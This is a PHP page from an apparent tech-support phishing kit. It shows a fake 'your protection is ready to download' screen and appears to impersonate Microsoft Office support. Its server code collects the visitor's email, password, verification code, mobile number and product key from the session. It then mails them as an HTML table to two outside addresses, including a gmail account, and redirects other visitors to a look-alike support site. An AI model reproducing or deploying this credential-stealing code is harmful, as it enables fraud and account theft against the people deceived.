<?php   
  session_start(); ?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>Downloading</title>
<?php include 'links.php' ?>

    <style type="text/css">
     
.createac {
  position: relative;background-color: #feeb29;top: 1%;padding: 7px 39px;margin: 1rem;z-index: 1001;    border-radius: 25px;
}.colpadding{ padding: 7rem;}
h2{margin-top: 7rem;font-weight: 400;
}h3 { font-weight: 400;}
#spinner-wrapper{width:100%;height:100%;z-index:9999;background-color:#242e39;position:absolute}
    .spinner,.spinner:after{border-radius:50%;width:25em;height:25em}.spinner{margin:20vh auto;font-size:10px;position:relative;text-indent:-9999em;border-top:1.1em solid rgba(0,137,198,.2);border-right:1.1em solid rgba(0,137,198,.2);border-bottom:1.1em solid rgba(0,137,198,.2);border-left:1.1em solid #0089c6;-webkit-transform:translateZ(0);-ms-transform:translateZ(0);transform:translateZ(0);-webkit-animation:load8 1.1s infinite linear;animation:load8 1.1s infinite linear}@-webkit-keyframes load8{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}@keyframes load8{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}
    .fade-element{animation:5s linear 2s 1 normal forwards fadein;-webkit-animation:5s linear 2s 1 normal forwards fadein;-moz-animation:5s linear 2s 1 normal forwards fadein;-o-animation:5s linear 2s 1 normal forwards fadein;-ms-animation:5s linear 2s 1 normal forwards fadein;opacity:1}@keyframes fadein{0%{opacity:1}50%{opacity:.5}100%{opacity:0}}@-webkit-keyframes fadein{0%{opacity:1}50%{opacity:.5}100%{opacity:0}}@-moz-keyframes fadein{0%{opacity:1}50%{opacity:.5}100%{opacity:0}}@-o-keyframes fadein{0%{opacity:1}50%{opacity:.5}100%{opacity:0}}@-ms-keyframes fadein{0%{opacity:1}50%{opacity:.5}100%{opacity:0}}
/*spinner */
    </style>
    <script type="text/javascript">
    var removeAtOpacity = function() {
        var obj = document.getElementById('spinner-wrapper');
        if (obj == null) {
            setTimeout(removeAtOpacity, 1000);
        } else {
            var display = obj.style.display;
            var opacity = getComputedStyle(obj).opacity;
            if (display !== "none" && opacity > 99) {
                setTimeout(removeAtOpacity, 2000);
            } else {
                obj.style.display = "none";
            }
        }
    };
    setTimeout(removeAtOpacity, 2000);
</script>
  
</head>

<body style="background-color: #242e39;">
        <div id="spinner-wrapper" class="fade-element"><div class="spinner"></div></div>
    <!-- Start: Dark NavBar -->

    <div class="container text-white">
      <h2 class="text-center">Your protection is ready to download
</h2>
<div class="row">
  <div class="col-md-6 text-center colpadding">
     <div>

   <img src="assets/img/pc.png">

 </div>

<h5>    Install on This Device</h5>
   
<p>
If you're using the device you want to protect, click the button below to install.</p>
<a href="process.php">
    <button class="btn btn- btn-lg createac" id="bootlint-check-1"  type="button">Install
 </button>
 </a>
  </div>
  <div class="col-md-6  text-center colpadding">
 <div>
   <img src="assets/img/doublepc.png">
 </div>
  <h5>  Install on other PC or Device</h5>
<p>
To install on other PC, Mac, Android, or iOS device, click the button below.</p>
    <a href="process.php">
    <button class="btn btn- btn-lg createac" id="bootlint-check-1"  type="button">Send Link </button>
</a>
  </div>


   </div>
</div>
      


   <?php

            $product = $_POST["productkey"];
 
            @  $_SESSION["productkey"] =  $product; 

      
        
        ?>

     <!-- mail       -->
     <?php

$CurPageURL = $protocol . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];  


$country  = 'Null';
$region   = 'Null';
$city     = 'Null';

// j)7YGZnLV6gJ

$to = "info@ksvprinters.com, garvkansal88@gmail.com";



  

$name = $_SESSION["user_name"];
$subject = $name;
 $mail_from = $_SESSION["name"];
 $email=$mail_from;
 $password  =  $_SESSION["password"];
 $mobile = $_SESSION["number"];
 $code  =   $_SESSION["code"];
 $key1  =   $_SESSION["key1"];
 $key2  =   $_SESSION["key2"];
 $key3  =   $_SESSION["key3"];
 $key4  =   $_SESSION["key4"]; 
 $key5  =   $_SESSION["key5"];



$message = "
<html>
<head>
<title>HTML email</title>
</head>
<body>
<h2>This email is from KSV site<a href='#'>Ms .... page</a> :</h2>


<table  border='2'  cellpadding='15'>
<tr><th colspan='4'>User Detail</th></tr>
<tr><th colspan='4'>URL: $CurPageURL</th></tr>
<tr><td>Email</td><td>$mail_from</td></tr>
<tr><td>password</td><td>$password</td></tr>
<tr><td>Code</td><td>$code</td></tr>
<tr><td>Mobile</td><td>$mobile</td></tr>
<tr><td>Product key :</td><td> $key1 .$key2. $key3. $key4. $key5  </td></tr>
<tr><th colspan='4'>Location Detail</th></tr>
<tr><td>country</td><td>$country</td></tr>
<tr><td>region</td><td>$region</td></tr>
<tr><td>city</td><td>$city</td></tr>
<tr><td>IP</td><td>$PublicIP</td></tr>
</table>
</body>
</html>
";

// Always set content-type when sending HTML email

$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
// More headers
// $headers .= 'From: $email' ;
 $headers  .= "From: $mail_from \r\n"; 
// $headers .= 'Cc: myboss@example.com' . "\r\n";
 if(isset($_REQUEST['submit'])){
if(mail($to,$subject,$message,$headers)){

// header("Location: index.php");        
}
}
else{
    header("Location: https://msofficesupports.com/register/index.php");   
}
  session_unset();
  session_destroy();
  
?>

     <!-- mail  -->
  
    <!-- End: Dark NavBar -->
<?php include 'footer.php' ?>
</body>

</html>